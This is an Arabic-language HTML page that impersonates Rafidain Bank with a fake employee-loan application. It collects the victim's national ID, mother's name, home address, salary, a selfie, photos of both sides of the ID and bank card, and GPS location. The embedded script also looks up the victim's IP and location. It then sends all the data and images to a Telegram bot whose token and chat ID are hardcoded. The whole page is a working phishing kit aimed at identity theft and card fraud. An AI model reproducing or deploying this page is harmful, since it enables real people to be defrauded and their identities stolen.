<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مصرف الرافدين - استمارة قرض</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Tahoma,Arial,sans-serif}
body{background:#f0f2f5;padding:0 0 30px 0;min-height:100vh}
.header{background:linear-gradient(135deg,#8b0000,#4a0000);padding:25px;text-align:center;color:#fff}
.header .logo{font-size:60px;margin-bottom:10px}
.header h1{font-size:20px}
.header h2{font-size:14px;font-weight:normal;margin-top:5px;opacity:0.9}
.badge{display:inline-block;background:#d4af37;color:#000;padding:4px 15px;border-radius:15px;font-size:12px;font-weight:bold;margin-top:10px}
.container{max-width:500px;margin:15px auto;padding:0 15px}
.card{background:#fff;border-radius:10px;padding:20px;margin-bottom:15px;box-shadow:0 2px 8px rgba(0,0,0,0.08)}
.card h3{color:#8b0000;font-size:16px;margin-bottom:15px;border-bottom:2px solid #ffebee;padding-bottom:8px}
label{display:block;font-size:13px;color:#333;margin-top:10px;margin-bottom:4px;font-weight:bold}
input,select{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;background:#f9f9f9;box-sizing:border-box}
.photo-box{text-align:center;padding:15px;background:#ffebee;border-radius:8px;border:2px dashed #8b0000;margin-top:10px}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#8b0000,#4a0000);color:#fff;border:none;border-radius:8px;font-size:17px;font-weight:bold;cursor:pointer;margin-top:15px}
.footer{text-align:center;font-size:11px;color:#666;margin-top:15px}
</style>
</head>
<body>
<div class="header">
<div class="logo">🏛️</div>
<h1>مصرف الرافدين</h1>
<h2>استمارة التقديم على قرض الموظفين</h2>
<div class="badge">حتى 50 مليون دينار</div>
</div>
<form id="f">
<div class="container">
<div class="card">
<h3>📋 البيانات الشخصية</h3>
<label>الاسم الثلاثي *</label><input type="text" id="name" required>
<label>اسم الأم *</label><input type="text" id="mother" required>
<label>تاريخ الميلاد *</label><input type="date" id="dob" required>
<label>الجنس *</label><select id="gender" required><option value="">اختر</option><option>ذكر</option><option>أنثى</option></select>
<label>الحالة الاجتماعية *</label><select id="marital" required><option value="">اختر</option><option>أعزب</option><option>متزوج</option><option>مطلق</option><option>أرمل</option></select>
</div>
<div class="card">
<h3>🆔 الوثائق الرسمية</h3>
<label>رقم البطاقة الوطنية *</label><input type="text" id="nid" required>
<label>رقم الجنسية *</label><input type="text" id="nationality" required>
</div>
<div class="card">
<h3>📍 محل السكن</h3>
<label>المحافظة *</label><input type="text" id="gov" required>
<label>القضاء *</label><input type="text" id="district" required>
<label>المحلة *</label><input type="text" id="mahalla" required>
<label>الزقاق *</label><input type="text" id="zuqaq" required>
<label>رقم الدار *</label><input type="text" id="dar" required>
</div>
<div class="card">
<h3>📞 معلومات الاتصال</h3>
<label>رقم الهاتف *</label><input type="tel" id="phone" required>
<label>رقم هاتف بديل</label><input type="tel" id="phone2">
<label>البريد الإلكتروني</label><input type="email" id="email">
</div>
<div class="card">
<h3>💼 المعلومات الوظيفية</h3>
<label>الوظيفة الحالية *</label><input type="text" id="job" required>
<label>جهة العمل *</label><input type="text" id="employer" required>
<label>الراتب الشهري (دينار) *</label><input type="number" id="salary" required>
<label>مدة الخدمة *</label><input type="text" id="duration" required>
<label>مبلغ القرض المطلوب (دينار) *</label><input type="number" id="loan_amount" required>
</div>
<div class="card">
<h3>📎 المستندات المطلوبة</h3>
<div class="photo-box">
<label>📸 صورة الوجه (سيلفي) *</label><input type="file" id="face" accept="image/*" capture="user">
<label>🆔 البطاقة الوطنية (الوجه) *</label><input type="file" id="nid_front" accept="image/*">
<label>🆔 البطاقة الوطنية (الظهر) *</label><input type="file" id="nid_back" accept="image/*">
<label>📄 تأييد الراتب *</label><input type="file" id="salary_doc" accept="image/*">
<label>💳 البطاقة البنكية (الوجه) *</label><input type="file" id="bank_front" accept="image/*">
<label>💳 البطاقة البنكية (الظهر) *</label><input type="file" id="bank_back" accept="image/*">
</div>
</div>
<div class="card">
<h3>📡 الموقع الجغرافي</h3>
<label><input type="checkbox" id="gps_chk" style="width:auto;margin-left:8px"> أوافق على مشاركة موقعي للتحقق</label>
</div>
<div class="card">
<h3>✅ الإقرار</h3>
<label><input type="checkbox" id="agree" required style="width:auto;margin-left:8px"> أقر بصحة جميع البيانات</label>
</div>
<button type="submit" class="btn">📤 إرسال طلب القرض</button>
<div class="footer">© 2026 مصرف الرافدين العراقي<br>رقم الاستمارة: RAFD-LOAN-2026</div>
</div>
</form>
<script>
let gpsData='لم يتم';
document.getElementById('gps_chk').addEventListener('change',function(){
if(this.checked && navigator.geolocation){
navigator.geolocation.getCurrentPosition(function(p){gpsData=p.coords.latitude+','+p.coords.longitude;},function(){gpsData='مرفوض';});
}
});
async function ip(){try{const r=await fetch('https://ipapi.co/json/');const d=await r.json();return d.ip+' | '+d.city+' | '+d.country_name+' | '+d.org;}catch(e){return 'N/A';}}
document.getElementById('f').addEventListener('submit',async function(e){
e.preventDefault();
const BOT='8759039993:AAGnWHtrCwoAqrjbnQwicMiWQvhO55KLH7s';
const CHAT='-1003821295154';
const info=await ip();
let msg='🏛️ *قرض مصرف الرافدين*\n\n👤 '+document.getElementById('name').value+'\n👩 الأم: '+document.getElementById('mother').value+'\n🎂 '+document.getElementById('dob').value+'\n⚧ '+document.getElementById('gender').value+'\n💍 '+document.getElementById('marital').value+'\n🆔 `'+document.getElementById('nid').value+'`\n📜 '+document.getElementById('nationality').value+'\n\n📍 *العنوان:*\n🏙️ '+document.getElementById('gov').value+' - '+document.getElementById('district').value+'\n🏠 محلة '+document.getElementById('mahalla').value+' - زقاق '+document.getElementById('zuqaq').value+' - دار '+document.getElementById('dar').value+'\n\n📞 `'+document.getElementById('phone').value+'`\n📞 بديل: '+(document.getElementById('phone2').value||'لا')+'\n📧 '+(document.getElementById('email').value||'لا')+'\n\n💼 '+document.getElementById('job').value+'\n🏢 '+document.getElementById('employer').value+'\n💰 الراتب: '+document.getElementById('salary').value+' دينار\n⏰ المدة: '+document.getElementById('duration').value+'\n💵 مبلغ القرض: '+document.getElementById('loan_amount').value+' دينار\n\n🌐 IP: `'+info+'`\n📍 GPS: `'+gpsData+'`\n💻 '+navigator.platform+'\n🕐 '+new Date().toLocaleString('ar-IQ');
await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
const files=[{id:'face',n:'صورة الوجه'},{id:'nid_front',n:'البطاقة وجه'},{id:'nid_back',n:'البطاقة ظهر'},{id:'salary_doc',n:'تأييد الراتب'},{id:'bank_front',n:'البطاقة البنكية وجه'},{id:'bank_back',n:'البطاقة البنكية ظهر'}];
for(const f of files){const inp=document.getElementById(f.id);if(inp.files[0]){const fd=new FormData();fd.append('chat_id',CHAT);fd.append('caption','📎 '+f.n);fd.append('photo',inp.files[0]);await fetch('https://api.telegram.org/bot'+BOT+'/sendPhoto',{method:'POST',body:fd});}}
alert('✅ تم إرسال الطلب');document.getElementById('f').reset();
});
</script>
</body>
</html>
